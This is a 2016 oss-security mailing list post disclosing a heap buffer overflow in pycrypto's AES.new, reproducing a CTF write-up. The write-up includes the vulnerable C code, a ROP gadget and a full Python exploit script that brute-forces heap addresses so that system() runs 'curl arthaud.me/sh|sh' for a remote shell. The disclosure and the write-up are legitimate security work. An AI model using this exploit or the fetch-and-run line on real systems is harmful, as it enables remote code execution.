X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7704" "Monday" "26" "December" "2016" "20:09:25" "-0500" "Leo Famulari" "leo@famulari.name" "<20161227010925.GA13877@jasmine>" "248" "[oss-security] Buffer overflow in pycrypto" nil nil nil "12" "2016122701:09:25" "[oss-security] Buffer overflow in pycrypto" (number mark "U       leo@famulari Dec 26  248/7704  " thread-indent "\"[oss-security] Buffer overflow in pycrypto\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21823 invoked by uid 550); 27 Dec 2016 02:13:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25964 invoked from network); 27 Dec 2016 01:09:39 -0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; d=famulari.name; h=
	content-type:date:from:message-id:mime-version:subject:to
	:x-me-sender:x-me-sender:x-sasl-enc:x-sasl-enc; s=mesmtp; bh=Xa3
	nHj669g36Q763lnyK0JS5Da0=; b=EojJv+Qo/r7AOrPCvNjw7ZyF3myp3iizG5i
	HcbfFLdoAXAfNbsy3fNsPS25VynSDWg1ZMmcEMIY09ikuhgs4nqyZL+ZhoRcgqWb
	xblk09Gwh9HW+72zl7byHcrEZjJ6FhmFxXBQ8rkjcfFARPxc73ByTMO/8xR1TqJz
	qKKaCrrg=
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; d=
	messagingengine.com; h=content-type:date:from:message-id
	:mime-version:subject:to:x-me-sender:x-me-sender:x-sasl-enc
	:x-sasl-enc; s=smtpout; bh=Xa3nHj669g36Q763lnyK0JS5Da0=; b=BCZFA
	wslPFPMz0yOha1cXI/aWCYqV6ap2k7EBGovDupPRwRlFBvhQ3A1E3/kCkf2xyXA7
	8iBomlKnAWj7orTsZRmZiQwCmPUIVOg4vrs1bJ9tVl8lsU37v3gw+6oouhAVAKWE
	1zzW3l2nazOCW29Tduexmsx84JmG1sIaf8ekm8=
X-ME-Sender: <xms:R79hWG2VBqDRyX5RUmIFVxo0XH4f6yFqF1_2zva31krr8TEjWNFU2g>
X-Sasl-enc: NNr4GPGJvDw0l+L59WhMS+zreaRCiYKKwaZ/uZRyncO+ 1482800967
Date: Mon, 26 Dec 2016 20:09:25 -0500
From: Leo Famulari <leo@famulari.name>
To: oss-security <oss-security@lists.openwall.com>
Message-ID: <20161227010925.GA13877@jasmine>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="dDRMvlgZJXvWKvBx"
Content-Disposition: inline
User-Agent: Mutt/1.7.2 (2016-11-26)
Subject: [oss-security] Buffer overflow in pycrypto

--dDRMvlgZJXvWKvBx
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

I noticed this bug report in the pycrypto bug tracker:

"AES.new with invalid parameter crashes python"
https://github.com/dlitz/pycrypto/issues/176

The original report, from that GitHub page:
------
In Crypto 2.6.1 and Python 2.7.10 and 3.4.3
folowing code causes crash:

from Crypto.Cipher import AES

AES.new(b'\000' * 16, AES.MODE_ECB, b'\000' * 540)
------

Apparently this issue is fixed on pycrypto's development branch with
commit 8dbe0dc3eea5c689d4f76b37b93fe216cf1f00d4, but this change can't
be applied directly to the latest pycrypto release tarball; too much has
changed.

https://github.com/dlitz/pycrypto/commit/8dbe0dc3eea5c689d4f76b37b93fe216cf=
1f00d4

Linked from the pycrypto bug #176 discussion, someone has used the bug
to get a remote shell. This report is reproduced in the remainder of
this message:

https://pony7.fr/ctf:public:32c3:cryptmsg

cryptmsg - Writeup by Maxima
Challenge

Can you find the bug?

http://136.243.194.56:8000/
Solution

The website allows us to encrypt and decrypt messages using AES. The
encryption is performed by cryptmsg.py, using the python library
pycrypto. After a few searches, I found out that there was a bug in
pycrypto: https://github.com/dlitz/pycrypto/issues/176. We can use this
vulnerability to get a shell.

I first tried to guess the architecture on the server. I managed to get
it by causing a python stacktrace:

curl "http://136.243.194.56:8000/cgi-bin/cryptmsg.py?what=3Denc&msg=3DAAAAA=
AAAAAAAAAAA&key=3DAAAAAAAAAAAAAAAA&mode=3D42&iv=3DAAAAAAAAAAAAAAAA"

In the stacktrace, the path to the shared object is
/usr/lib/pyth=E2=80=A6t-packages/Crypto/Cipher/_AES.i386-linux-gnu.so, se we
know that the architecture is i386 (x86 32bits). I also assumed that the
server runs on Ubuntu Server 15.10, since that was what they were
running on some of their other challenge servers. I quickly set up a
virtual machine to have the same environment.

Then I dove more deeply in the source code. Here is the code in
src/block_templace.c in pycrypto source code:

static ALGobject *
ALGnew(PyObject *self, PyObject *args, PyObject *kwdict)
{
	unsigned char *key, *IV;
	ALGobject * new=3DNULL;
	int keylen, IVlen=3D0, mode=3DMODE_ECB, segment_size=3D0;
	PyObject *counter =3D NULL;
	int counter_shortcut =3D 0;
=20
        // [...]
=20
	/* Set default values */
	if (!PyArg_ParseTupleAndKeywords(args, kwdict, "s#|is#Oi",
					 kwlist,
					 &key, &keylen, &mode, &IV, &IVlen,
					 &counter, &segment_size))=20
	{
		return NULL;
	}
=20
	// [...]
        new =3D newALGobject();
        // [...]
=20
	memset(new->IV, 0, BLOCK_SIZE);
	memset(new->oldCipher, 0, BLOCK_SIZE);
	memcpy(new->IV, IV, IVlen); // buffer overflow!
	new->mode =3D mode;
	new->count=3DBLOCK_SIZE;   /* stores how many bytes in new->oldCipher have=
 been used */
	return new;
}

And here is the ALGobject structure:

#define BLOCK_SIZE 16
=20
typedef struct=20
{
	PyObject_HEAD=20
	int mode, count, segment_size;
	unsigned char IV[BLOCK_SIZE], oldCipher[BLOCK_SIZE];
	PyObject *counter;
	int counter_shortcut;
	block_state st;
} ALGobject;

Thus there is a heap buffer overflow on IV. We can basically write as
many bytes as we want on a part of the heap.

The next step is to get the control of the execution flow. The idea is
to overwrite the counter pointer to introduce a fake python object. Here
is what a python object structure looks like:

typedef struct _object {
    Py_ssize_t ob_refcnt;
    struct _typeobject *ob_type;
} PyObject;

The first element is the reference counter on this object. The second
element is a pointer on the type of the object. Here is the type
structure:

typedef struct _typeobject {=20=20
    Py_ssize_t ob_refcnt;
    struct _typeobject *ob_type;
    Py_ssize_t ob_size; /* Number of items in variable part */
=20
    const char *tp_name; /* For printing, in format "<module>.<name>" */
    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */
=20
    /* Methods to implement standard operations */
=20
    destructor tp_dealloc;
    printfunc tp_print;
    getattrfunc tp_getattr;
    setattrfunc tp_setattr;
    cmpfunc tp_compare;
    reprfunc tp_repr;
=20
    // [...]
} PyTypeObject;

We are going to create a fake object associated to a fake type. When the
object gets deallocated, the function pointer tp_dealloc will be used.
In the fake type, we will put a pointer on a gadget to get a shell.
Fortunately, system() is available in the PLT.

I found a nice gadget in the python binary, using ropper:

   0x81580d6:	push   edx
   0x81580d7:	call   DWORD PTR [eax+0x18]

When the object is deallocated, edx contains the address of the type,
and eax contains the address of the object. We can create a fake object
and a fake type that will execute a command:

def p(v):
    return struct.pack('<I', v)
=20
fake_object =3D p(1) # ref counter
fake_object +=3D p(fake_type_addr) # type object
fake_object +=3D b'\x00' * 16
fake_object +=3D p(system_addr)
=20
fake_type =3D cmd.ljust(24, b'\x00')
fake_type +=3D p(call_gadget)

Here, call_gadget =3D 0x81580d6 and system_addr =3D 0x0805a2f0 (you can get
them easily using gdb). The problem is that we don't know yet where our
fake_object and fake_type will be because of ASLR. The heap is mapped to
a random address. Because the server runs on a 32bits architecture, we
know that we can bruteforce it. We will put our fake_object and
fake_type a lot of times in the memory, and use for fake_object_addr a
potential address right in the middle of the heap.

I will execute the command curl arthaud.me/sh|sh that'll give me a
shell. Here is my final script:

#!/usr/bin/env python3
import struct
import requests
=20
=20
def p(v):
    return struct.pack('<I', v)
=20
cmd =3D b'curl arthaud.me/sh|sh\x00'
=20
system_addr =3D 0x0805a2f0
call_gadget =3D 0x81580d6 # push edx; call [eax + 0x18]
fake_object_addr =3D 0x84d673c
fake_type_addr =3D fake_object_addr + 0x1c
=20
fake_object =3D p(1) # ref counter
fake_object +=3D p(fake_type_addr) # type object
fake_object +=3D b'\x00' * 16
fake_object +=3D p(system_addr)
=20
assert len(cmd) <=3D 24
fake_type =3D cmd.ljust(24, b'\x00')
fake_type +=3D p(call_gadget)
=20
payload =3D b'I' * 32
payload +=3D p(fake_object_addr)
=20
data =3D (fake_object + fake_type) * 500
=20
qs =3D 'key=3D' + 'A' * 16
qs +=3D '&mode=3D1'
qs +=3D '&iv=3D' + ''.join('%%%02x' % c for c in payload)
qs +=3D '&x=3D' + ''.join('%%%02x' % c for c in data)
=20
i =3D 1
while True:
    print('\rAttempt %d' % i, end=3D'')
    i +=3D 1
    requests.get('http://136.243.194.56:8000/cgi-bin/cryptmsg.py?%s' % qs)

You can also use Ricky Zhou exploit.

After a few hours, I finally got a shell!

--dDRMvlgZJXvWKvBx
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEsFFZSPHn08G5gDigJkb6MLrKfwgFAlhhv0UACgkQJkb6MLrK
fwjFjxAAkDz5ikuuIyH2xx/DTi1Sl94n0uCb4vB1XTZDpGvNnYeAO9ox/Xttwxz9
Ghg33JHyM7c3AVr0E3nUKPtB6Bj6CIL77y1K67cGMYb0rtMRmwu6DByU63isoedO
ULFIpEQeck0XV6F4YInWnXXSEVgkzFL4UEzfRkxK/dZoZYHcLnmBIeclDGDc5N53
QMQ4HaE4E6t7UjAvdIhxkKs/Yb7V4AlZSk4bAQR5XBmNjLrwoWSUUjzgwe+jsR32
ztHJ0/j4LH+misc9lIy9m2Z7fL8NwXqzM1IeFlWvxLfFduz3Ls0tC6kszu6EufEG
brpHWjdSMidje7LTaE76CjlrrTKoAPcynApJB+ChfRi2L64vXffxgy6tv+clADWD
DK/OABTld9lhhqP3gRMqoIHB+4cckIn7O6QvV92ZAQVpXROqO0xabr6OXhXekAxM
wvywSMfGxOe2Guzrrf9p/jN9cyj6rZmhsKeTrhtpicd4bDZ3Y58WO2e+vwc9OENi
LeRqHD+wsNkbliar2HVF2wzdC5Mpy9Nj0lQcNaZFWljMxuyj32Ebv2D5EqlQqu92
C40dOEhhckUCfzzTpGoq40Se6QcJhfSgBnQ88Mw3SqYkETFTKfdHuqPsQT3YC7bB
16FM8IYAWjIsEsIUjiuo2Wwh2bWp5JyYv1MLg+Ty4BAuo/lkLrY=
=7U6/
-----END PGP SIGNATURE-----

--dDRMvlgZJXvWKvBx--
